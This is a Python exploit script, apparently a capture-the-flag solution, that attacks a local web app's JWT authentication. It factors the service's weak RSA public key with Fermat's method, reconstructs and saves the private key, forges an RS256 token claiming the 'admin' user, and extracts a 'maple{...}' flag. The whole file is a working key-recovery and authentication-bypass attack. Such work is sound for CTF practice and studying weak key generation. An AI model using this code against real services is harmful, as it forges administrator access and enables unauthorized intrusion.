from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse
import requests
import jwt
import re
from uuid import uuid1

# https://github.com/d4rkvaibhav/Fermat-Factorization/blob/master/fermat.py
def isqrt(n):
	x=n
	y=(x+n//x)//2
	while(y<x):
		x=y
		y=(x+n//x)//2
	return x
def fermat(n):
	t0=isqrt(n)+1
	counter=0
	t=t0+counter
	temp=isqrt((t*t)-n)
	while((temp*temp)!=((t*t)-n)):
		counter+=1
		t=t0+counter
		temp=isqrt((t*t)-n)
	s=temp
	p=t+s
	q=t-s
	return p,q


URL = "http://localhost:8000/"

# create a test user...
s = requests.Session()
username = str(uuid1())
password = str(uuid1())
r = s.post(URL + "register", data={"username":password, "password":username})
r = s.post(URL + "login", data={"username":password, "password":username})
token = s.cookies['jwt_auth_token']


print("Generating private key")
public_key = RSA.importKey(open('public.key', "r").read())
p, q = fermat(public_key.n)
assert p * q == public_key.n
e = 65537
phi = (p-1) * (q-1)
d = inverse(e, phi)
private_key = RSA.construct((public_key.n, e, d, p, q)).exportKey('PEM').decode()

with open("private.key", "w") as f:
    f.write(private_key)
    
forged_token = jwt.encode({"user":"admin"}, private_key, algorithm="RS256")
print("Created forged token:", forged_token)

r = requests.get(URL + "home", cookies={"jwt_auth_token":forged_token})

print("Flag:", re.search(r"maple{[a-zA-Z0-9_!\\-\\?]+}", r.text).group())